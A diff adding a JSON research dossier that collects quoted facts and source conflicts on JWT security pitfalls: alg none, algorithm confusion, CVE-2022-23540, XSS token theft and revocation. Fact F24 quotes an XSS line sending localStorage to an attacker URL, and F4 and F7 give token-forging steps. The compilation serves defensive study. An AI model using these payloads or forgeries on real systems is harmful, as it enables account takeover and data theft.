@@ -1,0 +1,595 @@
+{
+  "profile": "pitfall",
+  "question": "Find what breaks and why: token theft from localStorage / sessionStorage through XSS; CSRF when tokens ride in cookies; the claim that a self-contained JWT cannot be revoked before exp without server-side state; logout that only deletes the client copy; refresh token replay; alg: none and algorithm confusion; denylist growth and cache consistency; clock skew; the \"stateless JWT sessions\" critique. Must find: documented attacks, advisories or CVE entries, and the stated reason each one happens, plus where sources disagree.",
+  "terms": [],
+  "sources": [
+    {
+      "id": "S1",
+      "url": "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
+      "cache": "cache/d1402f8e38cb.txt",
+      "fetched": "2026-11-22T15:47:22Z",
+      "tier": "B",
+      "rank": 4,
+      "rule": null,
+      "rank_basis": "tier B: class (company engineering blog, Auth0 blog guest post by Tim McLean; originator rule not used: no saved page credits him with first publication)",
+      "seed": false,
+      "provenance_ref": null
+    },
+    {
+      "id": "S2",
+      "url": "https://github.com/advisories/GHSA-qwph-4952-7xr6",
+      "cache": "cache/a8bfb5bfb1bc.txt",
+      "fetched": "2026-11-22T15:47:48Z",
+      "tier": "B",
+      "rank": 2,
+      "rule": null,
+      "rank_basis": "tier B: class (official vulnerability dataset: GitHub Advisory Database, GitHub-reviewed record of CVE-2022-23540)",
+      "seed": false,
+      "provenance_ref": null
+    },
+    {
+      "id": "S3",
+      "url": "https://pragmaticwebsecurity.com/articles/oauthoidc/localstorage-xss.html",
+      "cache": "cache/c903f71e5ec6.txt",
+      "fetched": "2026-11-22T15:47:25Z",
+      "tier": "B",
+      "rank": 6,
+      "rule": null,
+      "rank_basis": "tier B: class (blog of Philippe De Ryck's one-person training firm; company blog and personal blog both fit, the higher number taken)",
+      "seed": false,
+      "provenance_ref": null
+    },
+    {
+      "id": "S4",
+      "url": "https://workos.com/blog/stateless-jwt-logout-problem",
+      "cache": "cache/894627767181.txt",
+      "fetched": "2026-11-22T15:48:23Z",
+      "tier": "B",
+      "rank": 4,
+      "rule": null,
+      "rank_basis": "tier B: class (company engineering blog, WorkOS blog)",
+      "seed": false,
+      "provenance_ref": null
+    }
+  ],
+  "facts": [
+    {
+      "id": "F1",
+      "source": "S1",
+      "summary": "The page says the verifier reads the alg header to choose the algorithm before the token (and so the header) is validated, which lets the attacker pick the verification method.",
+      "quote": "we haven't validated this token yet, which means that we haven't validated the header. This puts us in an awkward position: in order to validate the token, we have to allow attackers to select which method we use to verify the signature",
+      "loc": {
+        "heading": "Great. So, What's Wrong with That?",
+        "lines": [
+          431,
+          431
+        ]
+      }
+    },
+    {
+      "id": "F2",
+      "source": "S1",
+      "summary": "The none algorithm is meant for tokens whose integrity was already verified, and is one of two mandatory-to-implement algorithms, the other being HS256.",
+      "quote": "It is intended to be used for situations where the integrity of the token has already been verified. Interestingly enough, it is one of only two algorithms that are mandatory to implement (the other being HS256).",
+      "loc": {
+        "heading": "Meet the \"None\" Algorithm",
+        "lines": [
+          437,
+          437
+        ]
+      }
+    },
+    {
+      "id": "F3",
+      "source": "S1",
+      "summary": "Some libraries accepted alg none tokens as validly signed, so anyone could mint tokens with any payload and get arbitrary account access on some systems.",
+      "quote": "Unfortunately, some libraries treated tokens signed with the none algorithm as a valid token with a verified signature. The result? Anyone can create their own \"signed\" tokens with whatever payload they want, allowing arbitrary account access on some systems.",
+      "loc": {
+        "heading": "Meet the \"None\" Algorithm",
+        "lines": [
+          439,
+          439
+        ]
+      }
+    },
+    {
+      "id": "F4",
+      "source": "S1",
+      "summary": "The forged token is built by setting the header alg to none, editing the payload, and leaving the signature empty.",
+      "quote": "Modify the above example header to contain \"alg\": \"none\" instead of HS256. Make any desired changes to the payload. Use an empty signature (i.e. signature = \"\").",
+      "loc": {
+        "heading": "Meet the \"None\" Algorithm",
+        "lines": [
+          441,
+          441
+        ]
+      }
+    },
+    {
+      "id": "F5",
+      "source": "S1",
+      "summary": "The usual fix makes verification fail for none tokens only when a secret key was provided; the page says this leaves the root problem, that attackers control the algorithm choice.",
+      "quote": "if a secret key was provided, then token verification will fail for tokens using the none algorithm. This is a good idea, but it doesn't solve the underlying problem: attackers control the choice of algorithm.",
+      "loc": {
+        "heading": "Meet the \"None\" Algorithm",
+        "lines": [
+          443,
+          443
+        ]
+      }
+    },
+    {
+      "id": "F6",
+      "source": "S1",
+      "summary": "Algorithm confusion: a server that expects an RSA-signed token but receives an HMAC-signed one treats its RSA public key as the HMAC secret.",
+      "quote": "If a server is expecting a token signed with RSA, but actually receives a token signed with HMAC, it will think the public key is actually an HMAC secret key.",
+      "loc": {
+        "heading": "RSA or HMAC?",
+        "lines": [
+          463,
+          463
+        ]
+      }
+    },
+    {
+      "id": "F7",
+      "source": "S1",
+      "summary": "The attacker signs a chosen payload with HS256 using the server's PEM public key as the HMAC key, so anyone who knows the public key can forge tokens that pass verification.",
+      "quote": "Then, get the public key used on the server as a verification key (most likely in the text-based PEM format). Finally, sign your token using the PEM-formatted public key as an HMAC key. … End result? Anyone with knowledge of the public key can forge tokens that will pass verification.",
+      "loc": {
+        "heading": "RSA or HMAC?",
+        "lines": [
+          467,
+          473
+        ]
+      }
+    },
+    {
+      "id": "F8",
+      "source": "S1",
+      "summary": "Condition of the confusion attack: the key string the attacker uses must match the server's verification key exactly, format and line breaks included.",
+      "quote": "The strings must match exactly for the attack to work -- exact same format, and no extra or missing line breaks.",
+      "loc": {
+        "heading": "RSA or HMAC?",
+        "lines": [
+          471,
+          471
+        ]
+      }
+    },
+    {
+      "id": "F9",
+      "source": "S1",
+      "summary": "Affected libraries named: node-jsonwebtoken, pyjwt, namshi/jose, php-jwt and jsjwt when used with asymmetric keys (RS256 to RS512, ES256 to ES512); users should update. The note is marked updated 2015-04-20.",
+      "quote": "If you are using node-jsonwebtoken, pyjwt, namshi/jose, php-jwt or jsjwt with asymmetric keys (RS256, RS384, RS512, ES256, ES384, ES512) please update to the latest version. See jwt.io for more information on the vulnerable libraries. (Updated 2015-04-20)",
+      "loc": {
+        "heading": "Critical vulnerabilities in JSON Web Token libraries",
+        "lines": [
+          382,
+          382
+        ]
+      }
+    },
+    {
+      "id": "F10",
+      "source": "S1",
+      "summary": "The author asks libraries to take the algorithm as a verify() parameter, since the server already knows its algorithm and letting attackers supply it is unsafe.",
+      "quote": "I suggest that JWT libraries add an algorithm parameter to their verification function: … The server should already know what algorithm it uses to sign tokens, and it's not safe to allow attackers to provide this value.",
+      "loc": {
+        "heading": "Recommendations for Library Developers",
+        "lines": [
+          477,
+          481
+        ]
+      }
+    },
+    {
+      "id": "F11",
+      "source": "S1",
+      "summary": "Servers that need several algorithms should use a separate key per algorithm, found by kid, and libraries should use the alg header at most to check it matches the expected one.",
+      "quote": "a separate key can (and should) be used for each supported algorithm. JWT conveniently provides a \"key ID\" field (kid) for exactly this purpose. … I don't think JWT libraries should even look at the alg field in the header, except maybe to check that it matches what the expected algorithm was.",
+      "loc": {
+        "heading": "Recommendations for Library Developers",
+        "lines": [
+          483,
+          484
+        ]
+      }
+    },
+    {
+      "id": "F12",
+      "source": "S1",
+      "summary": "Users of a JWT library should make sure tokens with a different signature type are always rejected, using the library's algorithm allow or deny list where it has one.",
+      "quote": "Anyone using a JWT implementation should make sure that tokens with a different signature type are guaranteed to be rejected. Some libraries have an optional mechanism for whitelisting or blacklisting algorithms; take advantage of it, or you might end up at risk.",
+      "loc": {
+        "heading": "Recommendations for Library Developers",
+        "lines": [
+          486,
+          486
+        ]
+      }
+    },
+    {
+      "id": "F13",
+      "source": "S2",
+      "summary": "The GitHub-reviewed advisory for CVE-2022-23540 is titled as a jsonwebtoken signature validation bypass caused by an insecure default algorithm in jwt.verify(), published Dec 21, 2022 in auth0/node-jsonwebtoken.",
+      "quote": "jsonwebtoken vulnerable to signature validation bypass due to insecure default algorithm in jwt.verify()",
+      "loc": {
+        "heading": "CVE-2022-23540",
+        "lines": [
+          167,
+          179
+        ]
+      }
+    },
+    {
+      "id": "F14",
+      "source": "S2",
+      "summary": "In jsonwebtoken 8.5.1 and earlier, calling jwt.verify() with no algorithm set and a falsy secret or key falls back to the none algorithm, which bypasses signature validation.",
+      "quote": "In versions <=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the jwt.verify() function can lead to signature validation bypass due to defaulting to the none algorithm for signature verification.",
+      "loc": {
+        "heading": "Overview",
+        "lines": [
+          206,
+          206
+        ]
+      }
+    },
+    {
+      "id": "F15",
+      "source": "S2",
+      "summary": "An application is affected only when all three hold in jwt.verify(): an unsigned token arrives, no algorithms are specified, and a falsy secret or key (null, false, undefined) is passed.",
+      "quote": "You will be affected if all the following are true in the jwt.verify() function: … a token with no signature is received … no algorithms are specified … a falsy (e.g. null, false, undefined) secret or key is passed",
+      "loc": {
+        "heading": "Am I affected?",
+        "lines": [
+          210,
+          216
+        ]
+      }
+    },
+    {
+      "id": "F16",
+      "source": "S2",
+      "summary": "The fix is version 9.0.0, which drops default support for the none algorithm in jwt.verify().",
+      "quote": "Update to version 9.0.0 which removes the default support for the none algorithm in the jwt.verify() method.",
+      "loc": {
+        "heading": "How do I fix it?",
+        "lines": [
+          220,
+          220
+        ]
+      }
+    },
+    {
+      "id": "F17",
+      "source": "S2",
+      "summary": "From 9.0.0, an application that still needs the none algorithm must name it explicitly in the jwt.verify() options.",
+      "quote": "If you need 'none' algorithm, you have to explicitly specify that in jwt.verify() options.",
+      "loc": {
+        "heading": "Will the fix impact my users?",
+        "lines": [
+          224,
+          224
+        ]
+      }
+    },
+    {
+      "id": "F18",
+      "source": "S2",
+      "summary": "The advisory's CVSS v3.1 vector gives attack complexity High, privileges required Low and integrity impact High.",
+      "quote": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
+      "loc": {
+        "heading": "CVSS v3 base metrics",
+        "lines": [
+          329,
+          329
+        ]
+      }
+    },
+    {
+      "id": "F19",
+      "source": "S2",
+      "summary": "The advisory lists the weakness CWE-347, improper verification of a cryptographic signature.",
+      "quote": "Improper Verification of Cryptographic Signature",
+      "loc": {
+        "heading": "Weaknesses",
+        "lines": [
+          361,
+          363
+        ]
+      }
+    },
+    {
+      "id": "F20",
+      "source": "S3",
+      "summary": "Injected XSS code runs in the application's own execution context, so it has the same privileges as the application's legitimate code.",
+      "quote": "Concretely, the malicious code runs in the same environment as legitimate application code. As a consequence, it has the same privileges as legitimate appication code.",
+      "loc": {
+        "heading": "The effect of XSS",
+        "lines": [
+          59,
+          59
+        ]
+      }
+    },
+    {
+      "id": "F21",
+      "source": "S3",
+      "summary": "An XSS attacker can do anything the application can, including reading cookies, LocalStorage, SessionStorage and IndexedDB, and sending requests to remote servers.",
+      "quote": "The attacker can do anything the application can do, which includes … Reading cookie information … Reading locally stored data (e.g., LocalStorage, SessionStorage, IndexedDB) … Sending requests to remote servers",
+      "loc": {
+        "heading": "The effect of XSS",
+        "lines": [
+          61,
+          69
+        ]
+      }
+    },
+    {
+      "id": "F22",
+      "source": "S3",
+      "summary": "Because frontend access tokens are bearer tokens, an attacker holding one makes API calls the API cannot tell apart from the application's own.",
+      "quote": "If the attacker can obtain an access token, they would be able to make API calls that are indistinguishable from legitiamte API calls by the web application.",
+      "loc": {
+        "heading": "OAuth 2.0 tokens",
+        "lines": [
+          81,
+          81
+        ]
+      }
+    },
+    {
+      "id": "F23",
+      "source": "S3",
+      "summary": "A stolen refresh token gives the attacker long-term API access as the user, which the page gives as the reason refresh token rotation matters.",
+      "quote": "When a refresh token is stolen, it would grant the attacker long-term access to an API in the name of the user. That’s why security patterns such as refresh token rotation are important to detect and prevent the abuse of refresh tokens.",
+      "loc": {
+        "heading": "OAuth 2.0 tokens",
+        "lines": [
+          83,
+          83
+        ]
+      }
+    },
+    {
+      "id": "F24",
+      "source": "S3",
+      "summary": "Injected code can read and exfiltrate everything in LocalStorage; the page shows a one-line payload that sends the whole store, base64-encoded, to an attacker URL.",
+      "quote": "If your application stores data in LocalStorage, the malicous code injected by the attacker can easily reach that data and exfiltrate it. … new Image().src = \"https://maliciousfood.com/stealLocalStorage?values=\" … btoa(JSON.stringify(localStorage));",
+      "loc": {
+        "heading": "Token handling in web applications",
+        "lines": [
+          99,
+          104
+        ]
+      }
+    },
+    {
+      "id": "F25",
+      "source": "S3",
+      "summary": "The page says the threat goes beyond reading LocalStorage: XSS gives full control of the application code, so the attacker can change it to extract the token.",
+      "quote": "A successful XSS attack gives the attacker full control over your application code. In this particular scenario, that means the attacker can modify the code to extract the token from the application.",
+      "loc": {
+        "heading": "The true impact of XSS",
+        "lines": [
+          117,
+          117
+        ]
+      }
+    },
+    {
+      "id": "F26",
+      "source": "S3",
+      "summary": "Some SPA OAuth libraries keep the refresh token in a Web Worker and the access token in memory, which the page describes as making the token hard to steal.",
+      "quote": "the Web Worker isolates the refresh token from the application’s exeuction context. … The access token is kept in memory, making it hard for an attacker to steal it.",
+      "loc": {
+        "heading": "The true impact of XSS",
+        "lines": [
+          121,
+          121
+        ]
+      }
+    },
+    {
+      "id": "F27",
+      "source": "S3",
+      "summary": "A proof of concept that redefines MessageChannel intercepts each access token the Web Worker returns, letting the attacker steal access tokens for as long as the application runs in the browser.",
+      "quote": "When this code is injected by the attacker, the OAuth 2.0 library will start using the redefined MessageChannel. Whenever the Web Worker sends a response with the access token, the attacker will be able to intercept that response … This attack scenario allows the attacker to steal access tokens as long as the application is running in the user’s browser.",
+      "loc": {
+        "heading": "The true impact of XSS",
+        "lines": [
+          162,
+          162
+        ]
+      }
+    },
+    {
+      "id": "F28",
+      "source": "S3",
+      "summary": "The same technique can override XMLHttpRequest, Header objects or Strings; and where no refresh tokens are used, the attacker can run a silent authentication flow to get an access token straight from the token service.",
+      "quote": "An attacker can use a similar mechanism to override other language features, allowing the attacker to access properties of an XMLHttpRequest, a Header object, or even simple Strings. Additionally, when refresh tokens are not used, and attacker can always launch a silent authenticaiton flow to obtain an access token directly from the security token service.",
+      "loc": {
+        "heading": "The true impact of XSS",
+        "lines": [
+          164,
+          164
+        ]
+      }
+    },
+    {
+      "id": "F29",
+      "source": "S3",
+      "summary": "The author advises not to worry much about storage: LocalStorage when unsure, in-memory or Web Worker when experienced, saying these make an attack harder but never fix the root problem (XSS).",
+      "quote": "If you are unsure how to handle token storage, use LocalStorage. … If you know what you are doing, use in-memory storage or the Web Worker option. It makes an attack harder, but it never solves the root problem.",
+      "loc": {
+        "heading": "My recommendations",
+        "lines": [
+          174,
+          174
+        ]
+      }
+    },
+    {
+      "id": "F30",
+      "source": "S3",
+      "summary": "One XSS flaw gives the attacker full control of the application with no recovery, so the page puts the effort on preventing XSS.",
+      "quote": "a single XSS vulnerability means the attacker can take full control of your application. Given the dynamic nature of JAvaScript, there is no recovery at that point. That also implies that we need to focus on preventing XSS vulnerabilities in the first place.",
+      "loc": {
+        "heading": "My recommendations",
+        "lines": [
+          170,
+          170
+        ]
+      }
+    },
+    {
+      "id": "F31",
+      "source": "S4",
+      "summary": "A signed JWT stays valid until it expires whatever the server does; nothing reaches into a token already in a browser, so it is a bearer credential until expiry.",
+      "quote": "A signed JWT is valid until it expires, no matter what the server does. There is no \"log this user out\" button that reaches into a token already sitting in someone's browser. Once you've signed it, it's a bearer credential in the wild until the clock runs out.",
+      "loc": {
+        "heading": "Stateless JWTs have a logout problem — and enterprise customers will find it",
+        "lines": [
+          229,
+          229
+        ]
+      }
+    },
+    {
+      "id": "F32",
+      "source": "S4",
+      "summary": "The API accepts a stateless JWT on its signature and a future exp alone, never asking a database whether the session is still good, which is why the token cannot be taken back.",
+      "quote": "Your API trusts it because the signature checks out and the exp claim is in the future — it never asks a database whether the session is still good. … It's also why you can't take the token back.",
+      "loc": {
+        "heading": "Why \"just log them out\" doesn't work",
+        "lines": [
+          235,
+          235
+        ]
+      }
+    },
+    {
+      "id": "F33",
+      "source": "S4",
+      "summary": "The page states that every mitigation for this reintroduces, in some form, the server-side state that stateless JWTs removed.",
+      "quote": "Every mitigation for this comes down to reintroducing the state you removed, in one form or another.",
+      "loc": {
+        "heading": "Why \"just log them out\" doesn't work",
+        "lines": [
+          250,
+          250
+        ]
+      }
+    },
+    {
+      "id": "F34",
+      "source": "S4",
+      "summary": "Option one: short-lived access tokens (minutes) refreshed with a long-lived refresh token, so revocation means refusing the next access token at the refresh boundary.",
+      "quote": "Keep access tokens short-lived — minutes, not hours — so a revoked user's access expires on its own almost immediately. … Revocation then means refusing to issue the next access token: you revoke at the refresh boundary instead of mid-token.",
+      "loc": {
+        "heading": "Your two real options",
+        "lines": [
+          256,
+          256
+        ]
+      }
+    },
+    {
+      "id": "F35",
+      "source": "S4",
+      "summary": "Option two: a server-side denylist of revoked token IDs checked on every request; precise, but it adds a lookup per request, the round-trip JWTs were adopted to avoid.",
+      "quote": "A server-side denylist. Keep the longer-lived tokens but check every incoming token's ID against a list of revoked tokens. This works, and it's precise, but it reintroduces state — now every request does a lookup, which is the database round-trip you adopted JWTs to avoid.",
+      "loc": {
+        "heading": "Your two real options",
+        "lines": [
+          258,
+          258
+        ]
+      }
+    },
+    {
+      "id": "F36",
+      "source": "S4",
+      "summary": "With short tokens, revocation is only as fast as one token lifetime, so choosing the TTL trades security against latency.",
+      "quote": "The tradeoff is that \"instant\" really means \"within one token lifetime,\" so the TTL you choose is a direct security-versus-latency decision.",
+      "loc": {
+        "heading": "Your two real options",
+        "lines": [
+          260,
+          260
+        ]
+      }
+    },
+    {
+      "id": "F37",
+      "source": "S4",
+      "summary": "With rotation, a replayed stale refresh token signals theft, and the standard response is to revoke the whole token family so every holder of a descendant token must re-authenticate.",
+      "quote": "If a stale refresh token is replayed, that's a signal something is wrong — a copy of the token is being used somewhere it shouldn't be, and refresh rotation detects the token theft. … The standard response is to treat a replayed refresh token as a breach of that token family: revoke the entire chain, forcing every client holding a descendant of that token to re-authenticate.",
+      "loc": {
+        "heading": "Rotation buys you theft detection too",
+        "lines": [
+          283,
+          285
+        ]
+      }
+    },
+    {
+      "id": "F38",
+      "source": "S4",
+      "summary": "With hour-long stateless JWTs and no rotation, a user deprovisioned through SCIM keeps API access for up to an hour after the admin disables them.",
+      "quote": "If your sessions are stateless JWTs with hour-long TTLs and no rotation, that former employee keeps hitting your API for up to an hour after IT thinks they're locked out.",
+      "loc": {
+        "heading": "Where the enterprise pressure comes from",
+        "lines": [
+          305,
+          305
+        ]
+      }
+    },
+    {
+      "id": "F39",
+      "source": "S4",
+      "summary": "The vendor's position is that stateless JWTs remain the right default until someone must be logged out at once, with short access tokens and revocation at the refresh boundary.",
+      "quote": "Stateless JWTs are the right default until the moment someone needs to be logged out now. Don't abandon them. Keep access tokens short, revoke at the refresh boundary",
+      "loc": {
+        "heading": "The takeaway",
+        "lines": [
+          311,
+          311
+        ]
+      }
+    }
+  ],
+  "conflicts": [
+    {
+      "id": "X1",
+      "topic": "does the common none-algorithm check close the alg none bypass?",
+      "facts": [
+        "F5",
+        "F14",
+        "F15"
+      ],
+      "note": "S1 (2015 content) says libraries reject none when a secret key is provided; S2 shows jsonwebtoken <=8.5.1 still took unsigned tokens when the key was falsy and no algorithms were set, the case that check leaves open."
+    },
+    {
+      "id": "X2",
+      "topic": "does refresh token rotation catch token theft through XSS?",
+      "facts": [
+        "F37",
+        "F27",
+        "F28"
+      ],
+      "note": "S4 says rotation detects theft when a stale refresh token is replayed; S3's attacks take each newly issued access token or run a new silent flow, which replays no rotated refresh token."
+    },
+    {
+      "id": "X3",
+      "topic": "do short access-token lifetimes bound the damage of a stolen token?",
+      "facts": [
+        "F34",
+        "F27"
+      ],
+      "note": "S4 says a revoked user's access expires almost at once with short TTLs; S3 says an XSS payload keeps stealing fresh access tokens as long as the application runs, a case S4 does not address."
+    }
+  ]
+}
